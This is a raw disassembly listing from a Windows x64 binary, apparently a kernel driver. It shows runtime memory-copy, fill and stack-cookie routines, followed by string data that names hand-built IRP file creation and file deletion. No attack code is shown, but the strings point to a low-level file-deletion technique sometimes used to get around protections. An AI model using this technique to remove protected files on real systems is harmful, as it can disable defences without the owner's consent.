   140001e8a:	75 3d                	jne    0x140001ec9
   140001e8c:	83 3b 01             	cmpl   $0x1,(%rbx)
   140001e8f:	75 38                	jne    0x140001ec9
   140001e91:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140001e95:	8b 41 04             	mov    0x4(%rcx),%eax
   140001e98:	a8 01                	test   $0x1,%al
   140001e9a:	74 07                	je     0x140001ea3
   140001e9c:	83 21 fe             	andl   $0xfffffffe,(%rcx)
   140001e9f:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140001ea3:	8b 41 04             	mov    0x4(%rcx),%eax
   140001ea6:	a8 08                	test   $0x8,%al
   140001ea8:	74 07                	je     0x140001eb1
   140001eaa:	83 21 f7             	andl   $0xfffffff7,(%rcx)
   140001ead:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140001eb1:	8b 41 04             	mov    0x4(%rcx),%eax
   140001eb4:	a8 10                	test   $0x10,%al
   140001eb6:	74 07                	je     0x140001ebf
   140001eb8:	83 21 ef             	andl   $0xffffffef,(%rcx)
   140001ebb:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140001ebf:	8b 41 04             	mov    0x4(%rcx),%eax
   140001ec2:	a8 20                	test   $0x20,%al
   140001ec4:	74 03                	je     0x140001ec9
   140001ec6:	83 21 df             	andl   $0xffffffdf,(%rcx)
   140001ec9:	33 c0                	xor    %eax,%eax
   140001ecb:	48 83 c4 20          	add    $0x20,%rsp
   140001ecf:	5b                   	pop    %rbx
   140001ed0:	c3                   	ret
   140001ed1:	cc                   	int3
   140001ed2:	cc                   	int3
   140001ed3:	cc                   	int3
   140001ed4:	cc                   	int3
   140001ed5:	cc                   	int3
   140001ed6:	cc                   	int3
   140001ed7:	cc                   	int3
   140001ed8:	cc                   	int3
   140001ed9:	cc                   	int3
   140001eda:	cc                   	int3
   140001edb:	cc                   	int3
   140001edc:	cc                   	int3
   140001edd:	cc                   	int3
   140001ede:	cc                   	int3
   140001edf:	cc                   	int3
   140001ee0:	cc                   	int3
   140001ee1:	cc                   	int3
   140001ee2:	cc                   	int3
   140001ee3:	cc                   	int3
   140001ee4:	cc                   	int3
   140001ee5:	cc                   	int3
   140001ee6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001eed:	00 00 00 
   140001ef0:	48 3b 0d 09 21 00 00 	cmp    0x2109(%rip),%rcx        # 0x140004000
   140001ef7:	75 10                	jne    0x140001f09
   140001ef9:	48 c1 c1 10          	rol    $0x10,%rcx
   140001efd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001f02:	75 01                	jne    0x140001f05
   140001f04:	c3                   	ret
   140001f05:	48 c1 c9 10          	ror    $0x10,%rcx
   140001f09:	e9 02 00 00 00       	jmp    0x140001f10
   140001f0e:	cc                   	int3
   140001f0f:	cc                   	int3
   140001f10:	48 83 ec 38          	sub    $0x38,%rsp
   140001f14:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140001f1a:	48 8b d1             	mov    %rcx,%rdx
   140001f1d:	4c 8b 0d e4 20 00 00 	mov    0x20e4(%rip),%r9        # 0x140004008
   140001f24:	b9 f7 00 00 00       	mov    $0xf7,%ecx
   140001f29:	4c 8b 05 d0 20 00 00 	mov    0x20d0(%rip),%r8        # 0x140004000
   140001f30:	48 ff 15 c9 11 00 00 	rex.W call *0x11c9(%rip)        # 0x140003100
   140001f37:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f3c:	cc                   	int3
   140001f3d:	ff 25 bd 10 00 00    	jmp    *0x10bd(%rip)        # 0x140003000
   140001f43:	cc                   	int3
   140001f44:	48 83 ec 28          	sub    $0x28,%rsp
   140001f48:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140001f4c:	48 8b ca             	mov    %rdx,%rcx
   140001f4f:	49 8b d1             	mov    %r9,%rdx
   140001f52:	e8 0d 00 00 00       	call   0x140001f64
   140001f57:	b8 01 00 00 00       	mov    $0x1,%eax
   140001f5c:	48 83 c4 28          	add    $0x28,%rsp
   140001f60:	c3                   	ret
   140001f61:	cc                   	int3
   140001f62:	cc                   	int3
   140001f63:	cc                   	int3
   140001f64:	48 83 ec 28          	sub    $0x28,%rsp
   140001f68:	41 8b 00             	mov    (%r8),%eax
   140001f6b:	4c 8b c9             	mov    %rcx,%r9
   140001f6e:	44 8b d8             	mov    %eax,%r11d
   140001f71:	4c 8b d1             	mov    %rcx,%r10
   140001f74:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140001f78:	a8 04                	test   $0x4,%al
   140001f7a:	74 13                	je     0x140001f8f
   140001f7c:	41 8b 40 08          	mov    0x8(%r8),%eax
   140001f80:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140001f84:	f7 d8                	neg    %eax
   140001f86:	4c 03 d1             	add    %rcx,%r10
   140001f89:	48 63 c8             	movslq %eax,%rcx
   140001f8c:	4c 23 d1             	and    %rcx,%r10
   140001f8f:	49 63 c3             	movslq %r11d,%rax
   140001f92:	4e 8b 04 10          	mov    (%rax,%r10,1),%r8
   140001f96:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140001f9a:	8b 48 08             	mov    0x8(%rax),%ecx
   140001f9d:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140001fa1:	0f b6 54 01 03       	movzbl 0x3(%rcx,%rax,1),%edx
   140001fa6:	f6 c2 0f             	test   $0xf,%dl
   140001fa9:	74 08                	je     0x140001fb3
   140001fab:	8b c2                	mov    %edx,%eax
   140001fad:	83 e0 f0             	and    $0xfffffff0,%eax
   140001fb0:	4c 03 c8             	add    %rax,%r9
   140001fb3:	4d 33 c8             	xor    %r8,%r9
   140001fb6:	49 8b c9             	mov    %r9,%rcx
   140001fb9:	e8 32 ff ff ff       	call   0x140001ef0
   140001fbe:	48 83 c4 28          	add    $0x28,%rsp
   140001fc2:	c3                   	ret
   140001fc3:	cc                   	int3
   140001fc4:	ff 25 ae 10 00 00    	jmp    *0x10ae(%rip)        # 0x140003078
   140001fca:	ff 25 b0 10 00 00    	jmp    *0x10b0(%rip)        # 0x140003080
   140001fd0:	c2 00 00             	ret    $0x0
   140001fd3:	cc                   	int3
   140001fd4:	cc                   	int3
   140001fd5:	cc                   	int3
   140001fd6:	cc                   	int3
   140001fd7:	cc                   	int3
   140001fd8:	cc                   	int3
   140001fd9:	cc                   	int3
   140001fda:	cc                   	int3
   140001fdb:	cc                   	int3
   140001fdc:	cc                   	int3
   140001fdd:	cc                   	int3
   140001fde:	cc                   	int3
   140001fdf:	cc                   	int3
   140001fe0:	cc                   	int3
   140001fe1:	cc                   	int3
   140001fe2:	cc                   	int3
   140001fe3:	cc                   	int3
   140001fe4:	cc                   	int3
   140001fe5:	cc                   	int3
   140001fe6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001fed:	00 00 00 
   140001ff0:	ff e0                	jmp    *%rax
   140001ff2:	cc                   	int3
   140001ff3:	cc                   	int3
   140001ff4:	cc                   	int3
   140001ff5:	cc                   	int3
   140001ff6:	cc                   	int3
   140001ff7:	cc                   	int3
   140001ff8:	cc                   	int3
   140001ff9:	cc                   	int3
   140001ffa:	cc                   	int3
   140001ffb:	cc                   	int3
   140001ffc:	cc                   	int3
   140001ffd:	cc                   	int3
   140001ffe:	cc                   	int3
   140001fff:	cc                   	int3
   140002000:	48 8b c1             	mov    %rcx,%rax
   140002003:	49 83 f8 08          	cmp    $0x8,%r8
   140002007:	72 37                	jb     0x140002040
   140002009:	49 83 f8 10          	cmp    $0x10,%r8
   14000200d:	77 11                	ja     0x140002020
   14000200f:	4c 8b 1a             	mov    (%rdx),%r11
   140002012:	4a 8b 54 02 f8       	mov    -0x8(%rdx,%r8,1),%rdx
   140002017:	4c 89 19             	mov    %r11,(%rcx)
   14000201a:	4a 89 54 01 f8       	mov    %rdx,-0x8(%rcx,%r8,1)
   14000201f:	c3                   	ret
   140002020:	49 83 f8 20          	cmp    $0x20,%r8
   140002024:	77 5a                	ja     0x140002080
   140002026:	0f 10 02             	movups (%rdx),%xmm0
   140002029:	42 0f 10 4c 02 f0    	movups -0x10(%rdx,%r8,1),%xmm1
   14000202f:	0f 11 01             	movups %xmm0,(%rcx)
   140002032:	42 0f 11 4c 01 f0    	movups %xmm1,-0x10(%rcx,%r8,1)
   140002038:	c3                   	ret
   140002039:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002040:	4d 85 c0             	test   %r8,%r8
   140002043:	74 15                	je     0x14000205a
   140002045:	48 2b d1             	sub    %rcx,%rdx
   140002048:	72 16                	jb     0x140002060
   14000204a:	44 8a 1c 11          	mov    (%rcx,%rdx,1),%r11b
   14000204e:	48 ff c1             	inc    %rcx
   140002051:	49 ff c8             	dec    %r8
   140002054:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   140002058:	75 f0                	jne    0x14000204a
   14000205a:	c3                   	ret
   14000205b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002060:	49 03 c8             	add    %r8,%rcx
   140002063:	44 8a 5c 11 ff       	mov    -0x1(%rcx,%rdx,1),%r11b
   140002068:	48 ff c9             	dec    %rcx
   14000206b:	49 ff c8             	dec    %r8
   14000206e:	44 88 19             	mov    %r11b,(%rcx)
   140002071:	75 f0                	jne    0x140002063
   140002073:	c3                   	ret
   140002074:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000207b:	00 00 00 00 00 
   140002080:	4e 8d 1c 02          	lea    (%rdx,%r8,1),%r11
   140002084:	48 2b d1             	sub    %rcx,%rdx
   140002087:	73 09                	jae    0x140002092
   140002089:	4c 3b d9             	cmp    %rcx,%r11
   14000208c:	0f 87 6e 01 00 00    	ja     0x140002200
   140002092:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140002096:	48 83 c1 10          	add    $0x10,%rcx
   14000209a:	f6 c1 0f             	test   $0xf,%cl
   14000209d:	74 12                	je     0x1400020b1
   14000209f:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   1400020a3:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   1400020a7:	0f 11 00             	movups %xmm0,(%rax)
   1400020aa:	0f 28 c1             	movaps %xmm1,%xmm0
   1400020ad:	48 83 c1 10          	add    $0x10,%rcx
   1400020b1:	4c 03 c0             	add    %rax,%r8
   1400020b4:	4c 2b c1             	sub    %rcx,%r8
   1400020b7:	4d 8b c8             	mov    %r8,%r9
   1400020ba:	49 c1 e9 06          	shr    $0x6,%r9
   1400020be:	74 6f                	je     0x14000212f
   1400020c0:	49 81 f9 00 10 00 00 	cmp    $0x1000,%r9
   1400020c7:	0f 87 b3 00 00 00    	ja     0x140002180
   1400020cd:	49 83 e0 3f          	and    $0x3f,%r8
   1400020d1:	eb 2d                	jmp    0x140002100
   1400020d3:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400020da:	0f 1f 84 00 00 00 00 
   1400020e1:	00 
   1400020e2:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400020e9:	0f 1f 84 00 00 00 00 
   1400020f0:	00 
   1400020f1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400020f8:	0f 1f 84 00 00 00 00 
   1400020ff:	00 
   140002100:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140002104:	0f 10 54 11 10       	movups 0x10(%rcx,%rdx,1),%xmm2
   140002109:	0f 10 5c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm3
   14000210e:	0f 10 64 11 30       	movups 0x30(%rcx,%rdx,1),%xmm4
   140002113:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   140002117:	48 83 c1 40          	add    $0x40,%rcx
   14000211b:	49 ff c9             	dec    %r9
   14000211e:	0f 29 49 c0          	movaps %xmm1,-0x40(%rcx)
   140002122:	0f 29 51 d0          	movaps %xmm2,-0x30(%rcx)
   140002126:	0f 29 59 e0          	movaps %xmm3,-0x20(%rcx)
   14000212a:	0f 28 c4             	movaps %xmm4,%xmm0
   14000212d:	75 d1                	jne    0x140002100
   14000212f:	4d 8b c8             	mov    %r8,%r9
   140002132:	49 c1 e9 04          	shr    $0x4,%r9
   140002136:	74 19                	je     0x140002151
   140002138:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000213f:	00 
   140002140:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   140002144:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140002148:	48 83 c1 10          	add    $0x10,%rcx
   14000214c:	49 ff c9             	dec    %r9
   14000214f:	75 ef                	jne    0x140002140
   140002151:	49 83 e0 0f          	and    $0xf,%r8
   140002155:	74 0e                	je     0x140002165
   140002157:	4e 8d 5c 01 f0       	lea    -0x10(%rcx,%r8,1),%r11
   14000215c:	41 0f 10 0c 13       	movups (%r11,%rdx,1),%xmm1
   140002161:	41 0f 11 0b          	movups %xmm1,(%r11)
   140002165:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   140002169:	c3                   	ret
   14000216a:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002171:	0f 1f 84 00 00 00 00 
   140002178:	00 
   140002179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002180:	4d 8b c8             	mov    %r8,%r9
   140002183:	49 c1 e9 06          	shr    $0x6,%r9
   140002187:	49 83 e0 3f          	and    $0x3f,%r8
   14000218b:	0f 18 44 11 40       	prefetchnta 0x40(%rcx,%rdx,1)
   140002190:	eb 2e                	jmp    0x1400021c0
   140002192:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002199:	0f 1f 84 00 00 00 00 
   1400021a0:	00 
   1400021a1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400021a8:	0f 1f 84 00 00 00 00 
   1400021af:	00 
   1400021b0:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400021b7:	0f 1f 84 00 00 00 00 
   1400021be:	00 
   1400021bf:	90                   	nop
   1400021c0:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   1400021c4:	0f 10 54 11 10       	movups 0x10(%rcx,%rdx,1),%xmm2
   1400021c9:	0f 10 5c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm3
   1400021ce:	0f 10 64 11 30       	movups 0x30(%rcx,%rdx,1),%xmm4
   1400021d3:	0f 2b 41 f0          	movntps %xmm0,-0x10(%rcx)
   1400021d7:	48 83 c1 40          	add    $0x40,%rcx
   1400021db:	0f 18 44 11 40       	prefetchnta 0x40(%rcx,%rdx,1)
   1400021e0:	49 ff c9             	dec    %r9
   1400021e3:	0f 2b 49 c0          	movntps %xmm1,-0x40(%rcx)
   1400021e7:	0f 2b 51 d0          	movntps %xmm2,-0x30(%rcx)
   1400021eb:	0f 2b 59 e0          	movntps %xmm3,-0x20(%rcx)
   1400021ef:	0f 28 c4             	movaps %xmm4,%xmm0
   1400021f2:	75 cc                	jne    0x1400021c0
   1400021f4:	0f ae f8             	sfence
   1400021f7:	e9 33 ff ff ff       	jmp    0x14000212f
   1400021fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002200:	49 03 c8             	add    %r8,%rcx
   140002203:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140002208:	48 83 e9 10          	sub    $0x10,%rcx
   14000220c:	49 83 e8 10          	sub    $0x10,%r8
   140002210:	f6 c1 0f             	test   $0xf,%cl
   140002213:	74 18                	je     0x14000222d
   140002215:	4c 8b d9             	mov    %rcx,%r11
   140002218:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000221c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140002220:	41 0f 11 03          	movups %xmm0,(%r11)
   140002224:	0f 28 c1             	movaps %xmm1,%xmm0
   140002227:	4c 8b c1             	mov    %rcx,%r8
   14000222a:	4c 2b c0             	sub    %rax,%r8
   14000222d:	4d 8b c8             	mov    %r8,%r9
   140002230:	49 c1 e9 06          	shr    $0x6,%r9
   140002234:	74 39                	je     0x14000226f
   140002236:	49 83 e0 3f          	and    $0x3f,%r8
   14000223a:	eb 04                	jmp    0x140002240
   14000223c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002240:	0f 10 4c 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm1
   140002245:	0f 10 54 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm2
   14000224a:	0f 10 5c 11 d0       	movups -0x30(%rcx,%rdx,1),%xmm3
   14000224f:	0f 10 64 11 c0       	movups -0x40(%rcx,%rdx,1),%xmm4
   140002254:	0f 29 01             	movaps %xmm0,(%rcx)
   140002257:	48 83 e9 40          	sub    $0x40,%rcx
   14000225b:	49 ff c9             	dec    %r9
   14000225e:	0f 29 49 30          	movaps %xmm1,0x30(%rcx)
   140002262:	0f 29 51 20          	movaps %xmm2,0x20(%rcx)
   140002266:	0f 29 59 10          	movaps %xmm3,0x10(%rcx)
   14000226a:	0f 28 c4             	movaps %xmm4,%xmm0
   14000226d:	75 d1                	jne    0x140002240
   14000226f:	4d 8b c8             	mov    %r8,%r9
   140002272:	49 c1 e9 04          	shr    $0x4,%r9
   140002276:	74 19                	je     0x140002291
   140002278:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000227f:	00 
   140002280:	0f 29 01             	movaps %xmm0,(%rcx)
   140002283:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140002288:	48 83 e9 10          	sub    $0x10,%rcx
   14000228c:	49 ff c9             	dec    %r9
   14000228f:	75 ef                	jne    0x140002280
   140002291:	49 83 e0 0f          	and    $0xf,%r8
   140002295:	74 0f                	je     0x1400022a6
   140002297:	4c 8b d9             	mov    %rcx,%r11
   14000229a:	4d 2b d8             	sub    %r8,%r11
   14000229d:	41 0f 10 0c 13       	movups (%r11,%rdx,1),%xmm1
   1400022a2:	41 0f 11 0b          	movups %xmm1,(%r11)
   1400022a6:	0f 29 01             	movaps %xmm0,(%rcx)
   1400022a9:	c3                   	ret
   1400022aa:	cc                   	int3
   1400022ab:	cc                   	int3
   1400022ac:	cc                   	int3
   1400022ad:	cc                   	int3
   1400022ae:	cc                   	int3
   1400022af:	cc                   	int3
   1400022b0:	cc                   	int3
   1400022b1:	cc                   	int3
   1400022b2:	cc                   	int3
   1400022b3:	cc                   	int3
   1400022b4:	cc                   	int3
   1400022b5:	cc                   	int3
   1400022b6:	cc                   	int3
   1400022b7:	cc                   	int3
   1400022b8:	cc                   	int3
   1400022b9:	cc                   	int3
   1400022ba:	cc                   	int3
   1400022bb:	cc                   	int3
   1400022bc:	cc                   	int3
   1400022bd:	cc                   	int3
   1400022be:	cc                   	int3
   1400022bf:	cc                   	int3
   1400022c0:	48 8b c1             	mov    %rcx,%rax
   1400022c3:	49 83 f8 08          	cmp    $0x8,%r8
   1400022c7:	72 47                	jb     0x140002310
   1400022c9:	0f b6 d2             	movzbl %dl,%edx
   1400022cc:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   1400022d3:	01 01 01 
   1400022d6:	49 0f af d1          	imul   %r9,%rdx
   1400022da:	49 83 f8 4f          	cmp    $0x4f,%r8
   1400022de:	73 50                	jae    0x140002330
   1400022e0:	4d 8b c8             	mov    %r8,%r9
   1400022e3:	49 83 e1 f8          	and    $0xfffffffffffffff8,%r9
   1400022e7:	49 03 c9             	add    %r9,%rcx
   1400022ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400022f0:	4a 89 54 08 f8       	mov    %rdx,-0x8(%rax,%r9,1)
   1400022f5:	49 83 e9 08          	sub    $0x8,%r9
   1400022f9:	75 f5                	jne    0x1400022f0
   1400022fb:	49 83 e0 07          	and    $0x7,%r8
   1400022ff:	74 05                	je     0x140002306
   140002301:	4a 89 54 01 f8       	mov    %rdx,-0x8(%rcx,%r8,1)
   140002306:	c3                   	ret
   140002307:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000230e:	00 00 
   140002310:	49 83 e0 07          	and    $0x7,%r8
   140002314:	74 0a                	je     0x140002320
   140002316:	42 88 54 00 ff       	mov    %dl,-0x1(%rax,%r8,1)
   14000231b:	49 ff c8             	dec    %r8
   14000231e:	75 f6                	jne    0x140002316
   140002320:	c3                   	ret
   140002321:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002328:	0f 1f 84 00 00 00 00 
   14000232f:	00 
   140002330:	66 48 0f 6e c2       	movq   %rdx,%xmm0
   140002335:	0f 16 c0             	movlhps %xmm0,%xmm0
   140002338:	0f 11 01             	movups %xmm0,(%rcx)
   14000233b:	4c 03 c1             	add    %rcx,%r8
   14000233e:	48 83 c1 10          	add    $0x10,%rcx
   140002342:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140002346:	4c 2b c1             	sub    %rcx,%r8
   140002349:	4d 8b c8             	mov    %r8,%r9
   14000234c:	49 c1 e9 07          	shr    $0x7,%r9
   140002350:	74 2f                	je     0x140002381
   140002352:	0f 29 01             	movaps %xmm0,(%rcx)
   140002355:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140002359:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140002360:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   140002364:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   140002368:	49 ff c9             	dec    %r9
   14000236b:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   14000236f:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   140002373:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   140002377:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   14000237b:	75 d5                	jne    0x140002352
   14000237d:	49 83 e0 7f          	and    $0x7f,%r8
   140002381:	4d 8b c8             	mov    %r8,%r9
   140002384:	49 c1 e9 04          	shr    $0x4,%r9
   140002388:	74 12                	je     0x14000239c
   14000238a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002390:	0f 11 01             	movups %xmm0,(%rcx)
   140002393:	48 83 c1 10          	add    $0x10,%rcx
   140002397:	49 ff c9             	dec    %r9
   14000239a:	75 f4                	jne    0x140002390
   14000239c:	49 83 e0 0f          	and    $0xf,%r8
   1400023a0:	74 06                	je     0x1400023a8
   1400023a2:	42 0f 11 44 01 f0    	movups %xmm0,-0x10(%rcx,%r8,1)
   1400023a8:	c3                   	ret
   1400023a9:	cc                   	int3
   1400023aa:	cc                   	int3
   1400023ab:	cc                   	int3
   1400023ac:	cc                   	int3
   1400023ad:	cc                   	int3
   1400023ae:	cc                   	int3
   1400023af:	cc                   	int3
   1400023b0:	49 72 70             	rex.WB jb 0x140002423
   1400023b3:	43 72 65             	rex.XB jb 0x14000241b
   1400023b6:	61                   	(bad)
   1400023b7:	74 65                	je     0x14000241e
   1400023b9:	46 69 6c 65 20 45 72 	imul   $0x6f727245,0x20(%rbp,%r12,2),%r13d
   1400023c0:	72 6f 
   1400023c2:	72 5b                	jb     0x14000241f
   1400023c4:	30 78 25             	xor    %bh,0x25(%rax)
   1400023c7:	58                   	pop    %rax
   1400023c8:	5d                   	pop    %rbp
   1400023c9:	0a 00                	or     (%rax),%al
   1400023cb:	cc                   	int3
   1400023cc:	cc                   	int3
   1400023cd:	cc                   	int3
   1400023ce:	cc                   	int3
   1400023cf:	cc                   	int3
   1400023d0:	49 72 70             	rex.WB jb 0x140002443
   1400023d3:	53                   	push   %rbx
   1400023d4:	65 74 49             	gs je  0x140002420
   1400023d7:	6e                   	outsb  (%rsi),(%dx)
   1400023d8:	66 6f                	outsw  (%rsi),(%dx)
   1400023da:	72 6d                	jb     0x140002449
   1400023dc:	61                   	(bad)
   1400023dd:	74 69                	je     0x140002448
   1400023df:	6f                   	outsl  (%rsi),(%dx)
   1400023e0:	6e                   	outsb  (%rsi),(%dx)
   1400023e1:	46 69 6c 65 5b 53 65 	imul   $0x49746553,0x5b(%rbp,%r12,2),%r13d
   1400023e8:	74 49 
   1400023ea:	6e                   	outsb  (%rsi),(%dx)
   1400023eb:	66 6f                	outsw  (%rsi),(%dx)
   1400023ed:	72 6d                	jb     0x14000245c
   1400023ef:	61                   	(bad)
   1400023f0:	74 69                	je     0x14000245b
   1400023f2:	6f                   	outsl  (%rsi),(%dx)
   1400023f3:	6e                   	outsb  (%rsi),(%dx)
   1400023f4:	5d                   	pop    %rbp
   1400023f5:	20 45 72             	and    %al,0x72(%rbp)
   1400023f8:	72 6f                	jb     0x140002469
   1400023fa:	72 5b                	jb     0x140002457
   1400023fc:	30 78 25             	xor    %bh,0x25(%rax)
   1400023ff:	58                   	pop    %rax
   140002400:	5d                   	pop    %rbp
   140002401:	0a 00                	or     (%rax),%al
   140002403:	cc                   	int3
   140002404:	cc                   	int3
   140002405:	cc                   	int3
   140002406:	cc                   	int3
   140002407:	cc                   	int3
   140002408:	cc                   	int3
   140002409:	cc                   	int3
   14000240a:	cc                   	int3
   14000240b:	cc                   	int3
   14000240c:	cc                   	int3
   14000240d:	cc                   	int3
   14000240e:	cc                   	int3
   14000240f:	cc                   	int3
   140002410:	49 72 70             	rex.WB jb 0x140002483
   140002413:	53                   	push   %rbx
   140002414:	65 74 49             	gs je  0x140002460
   140002417:	6e                   	outsb  (%rsi),(%dx)
   140002418:	66 6f                	outsw  (%rsi),(%dx)
   14000241a:	72 6d                	jb     0x140002489
   14000241c:	61                   	(bad)
   14000241d:	74 69                	je     0x140002488
   14000241f:	6f                   	outsl  (%rsi),(%dx)
   140002420:	6e                   	outsb  (%rsi),(%dx)
   140002421:	46 69 6c 65 5b 44 65 	imul   $0x656c6544,0x5b(%rbp,%r12,2),%r13d
   140002428:	6c 65 
   14000242a:	74 65                	je     0x140002491
   14000242c:	46 69 6c 65 5d 20 45 	imul   $0x72724520,0x5d(%rbp,%r12,2),%r13d
   140002433:	72 72 
   140002435:	6f                   	outsl  (%rsi),(%dx)
   140002436:	72 5b                	jb     0x140002493
   140002438:	30 78 25             	xor    %bh,0x25(%rax)
   14000243b:	58                   	pop    %rax
   14000243c:	5d                   	pop    %rbp
   14000243d:	0a 00                	or     (%rax),%al
   14000243f:	cc                   	int3
   140002440:	5c                   	pop    %rsp
   140002441:	00 3f                	add    %bh,(%rdi)
   140002443:	00 3f                	add    %bh,(%rdi)
   140002445:	00 5c 00 41          	add    %bl,0x41(%rax,%rax,1)
   140002449:	00 3a                	add    %bh,(%rdx)
   14000244b:	00 5c 00 00          	add    %bl,0x0(%rax,%rax,1)
   14000244f:	00 52 6f             	add    %dl,0x6f(%rdx)
   140002452:	6f                   	outsl  (%rsi),(%dx)
   140002453:	74 50                	je     0x1400024a5
   140002455:	61                   	(bad)
   140002456:	74 68                	je     0x1400024c0
   140002458:	3a 25 77 5a 0a 00    	cmp    0xa5a77(%rip),%ah        # 0x1400a7ed5
   14000245e:	cc                   	int3
   14000245f:	cc                   	int3
   140002460:	49 6f                	rex.WB outsl (%rsi),(%dx)
   140002462:	43 72 65             	rex.XB jb 0x1400024ca
   140002465:	61                   	(bad)
   140002466:	74 65                	je     0x1400024cd
   140002468:	46 69 6c 65 20 45 72 	imul   $0x6f727245,0x20(%rbp,%r12,2),%r13d
   14000246f:	72 6f 
   140002471:	72 5b                	jb     0x1400024ce
   140002473:	30 78 25             	xor    %bh,0x25(%rax)
   140002476:	58                   	pop    %rax
   140002477:	5d                   	pop    %rbp
   140002478:	00 cc                	add    %cl,%ah
   14000247a:	cc                   	int3
   14000247b:	cc                   	int3
   14000247c:	cc                   	int3
   14000247d:	cc                   	int3
   14000247e:	cc                   	int3
   14000247f:	cc                   	int3
   140002480:	4f 62 52 65 66 65    	(bad)
   140002486:	72 65                	jb     0x1400024ed
   140002488:	6e                   	outsb  (%rsi),(%dx)
   140002489:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   14000248c:	62 6a 65 63 74       	(bad)
   140002491:	42 79 48             	rex.X jns 0x1400024dc
   140002494:	61                   	(bad)
   140002495:	6e                   	outsb  (%rsi),(%dx)
   140002496:	64 6c                	fs insb (%dx),(%rdi)
   140002498:	65 20 45 72          	and    %al,%gs:0x72(%rbp)
   14000249c:	72 6f                	jb     0x14000250d
   14000249e:	72 5b                	jb     0x1400024fb
   1400024a0:	30 78 25             	xor    %bh,0x25(%rax)
   1400024a3:	58                   	pop    %rax
   1400024a4:	5d                   	pop    %rbp
   1400024a5:	0a 00                	or     (%rax),%al
   1400024a7:	cc                   	int3
   1400024a8:	cc                   	int3
   1400024a9:	cc                   	int3
   1400024aa:	cc                   	int3
   1400024ab:	cc                   	int3
   1400024ac:	cc                   	int3
   1400024ad:	cc                   	int3
   1400024ae:	cc                   	int3
   1400024af:	cc                   	int3
   1400024b0:	49 6f                	rex.WB outsl (%rsi),(%dx)
   1400024b2:	41 6c                	rex.B insb (%dx),(%rdi)
   1400024b4:	6c                   	insb   (%dx),(%rdi)
   1400024b5:	6f                   	outsl  (%rsi),(%dx)
   1400024b6:	63 61 74             	movsxd 0x74(%rcx),%esp
   1400024b9:	65 49 72 70          	gs rex.WB jb 0x14000252d
   1400024bd:	20 45 72             	and    %al,0x72(%rbp)
   1400024c0:	72 6f                	jb     0x140002531
   1400024c2:	72 21                	jb     0x1400024e5
   1400024c4:	0a 00                	or     (%rax),%al
